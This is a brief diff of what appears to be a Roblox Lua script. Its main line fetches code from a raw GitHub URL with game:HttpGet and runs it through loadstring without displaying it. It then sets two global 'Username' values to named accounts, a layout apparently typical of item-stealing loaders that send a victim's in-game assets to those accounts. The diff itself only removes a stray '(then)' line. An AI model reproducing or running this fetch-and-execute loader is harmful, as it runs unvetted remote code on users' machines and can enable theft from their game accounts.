@@ -1,5 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/New"))()
-(then)
 
 _G.Username = "KrxmFisch"
 _G.Username2 = "nbvbw"
